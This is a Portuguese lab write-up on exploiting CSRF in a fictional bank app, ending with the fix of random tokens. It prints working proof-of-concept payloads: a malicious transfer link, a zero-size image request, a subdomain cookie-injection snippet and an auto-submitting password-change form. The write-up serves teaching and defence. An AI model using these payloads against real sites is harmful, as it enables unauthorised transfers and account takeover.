# 🛡️ CSRF na prática — Explorando MyBank e Double Submit Cookies

> Autor: @Piceli{DuckWare}

Este write-up documenta, passo a passo, o estudo e a exploração do laboratório de **CSRF** no ambiente fictício *mybank.thm*. 

Vamos ver:

- o que é CSRF  
- como o ataque funciona na prática no cenário do Josh  
- como o banco tentou se defender  
- como a defesa foi quebrada  
- e, por fim, como corrigir do jeito certo

---

## 🔍 O Desafio

No laboratório temos:

- **Josh**, usuário que:
  - mantém sessões abertas no banco (`http://mybank.thm:8080`)
  - acessa o webmail (`http://mailbox.thm:8081`)
- Um **atacante** com:
  - conta no mesmo banco  
  - conhecimento do formato das requisições  
  - controle do subdomínio `attacker.mybank.thm`

Josh é vulnerável porque:

- está sempre autenticado  
- acessa links enviados por e-mail  
- a aplicação não valida a origem das requisições  

O laboratório demonstra:

1. CSRF tradicional  
2. CSRF com imagem oculta  
3. CSRF assíncrono  
4. Defesa com Double Submit Cookies  
5. Bypass via token previsível + cookie injection  
6. Correção com tokens seguros

---

## 🧪 Etapa 1 – CSRF Clássico (Transferência de Dinheiro)

Formulário vulnerável:

```html
<form action="transfer.php" method="post">
    <input type="text" name="to_account">
    <input type="number" name="amount">
    <button type="submit">Transfer</button>
</form>
```

Link malicioso do atacante:

```html
<a href="http://mybank.thm:8080/dashboard.php?to_account=ATK&amount=1000">
    Click here
</a>
```

Quando Josh clica:

- O navegador envia o cookie de sessão automaticamente.
- O banco acredita que o pedido é legítimo.
- A transferência ocorre.

---

## 🖼️ Etapa 2 – Hidden Image Exploitation

```html
<img src="http://mybank.thm:8080/transfer.php?to=ATK&amount=1000" width="0" height="0">
```

Mesmo invisível, o navegador carrega a imagem → o ataque é disparado automaticamente.

---

## ⚙️ Etapa 3 – Adicionando um Token CSRF

O banco adiciona um campo oculto:

```html
<input type="hidden" name="csrf_token" value="<?php echo $_COOKIE['csrf-token']; ?>">
```

E valida assim:

```php
if (base64_decode($_POST['csrf_token']) == base64_decode($_COOKIE['csrf-token'])) {
    // OK
}
```

Agora links sem token não funcionam.

---

## 🧨 Etapa 4 – Token Previsível (Falha Crítica)

O atacante vê o cookie:

```
csrf-token = R0I4Mk1ZQkFOSzU2OTg=
```

Decodifica no CyberChef:

```
GB82MYBANK5698
```

Ou seja:

**O token é apenas Base64 do número da conta.**

Com isso, o atacante consegue gerar tokens válidos manualmente.

---

## 🌐 Etapa 5 – Subdomain Cookie Injection

O atacante usa `attacker.mybank.thm` para injetar um cookie válido:

```php
setcookie(
    'csrf-token',
    base64_encode("CONTA_DO_JOSH"),
    [
        'domain' => 'mybank.thm',
        'path' => '/',
        'samesite' => 'Lax'
    ]
);
```

O navegador passa a enviar esse cookie para **todo** o domínio `mybank.thm`.

---

## 🔐 Etapa 6 – Ataque Final: Mudança de Senha

Página maliciosa:

```html
<form method="post" action="http://mybank.thm:8080/changepassword.php" id="autos">
    <input name="current_password" value="GB82MYBANK5697">
    <input name="confirm_password" value="Attacker Unique Password">
    <input type="hidden" name="csrf_token" value="Base64_Conta_Josh">
    <button id="password_submit">Update</button>
</form>

<script>
document.getElementById('password_submit').click();
</script>
```

Fluxo:

1. O atacante injeta o cookie CSRF falso.
2. A página envia o formulário com os mesmos valores.
3. A validação passa.
4. A senha de Josh é alterada para **Attacker Unique Password**.

---

## 🔒 Etapa 7 – Correção Final

A equipe do banco finalmente implementa tokens **verdadeiramente aleatórios**.

Agora, quando o atacante tenta repetir o ataque, o sistema responde:

```
Invalid CSRF Token
```

---

## 🛠️ Ferramentas Usadas

- Navegador (Chrome/Firefox)
- DevTools
- Burp Suite / OWASP ZAP
- CyberChef
- Scripts HTML/PHP para PoCs
- Máquina virtual isolada

---

## 📌 Insights Importantes

- Navegadores sempre enviam cookies automaticamente.
- Tokens previsíveis são tão ruins quanto **não ter token**.
- Subdomínios podem comprometer cookies do domínio pai.
- Tokens CSRF precisam ser:
  - aleatórios  
  - imprevisíveis  
  - validados corretamente  

---

## ✅ Conclusão

Este laboratório mostra:

- como funciona um ataque CSRF real  
- como se explora uma aplicação vulnerável  
- como defesas mal implementadas podem ser burladas  
- e como corrigir de forma correta  

Mensagem final:

> **CSRF Tokens só funcionam quando são realmente aleatórios e bem validados.**
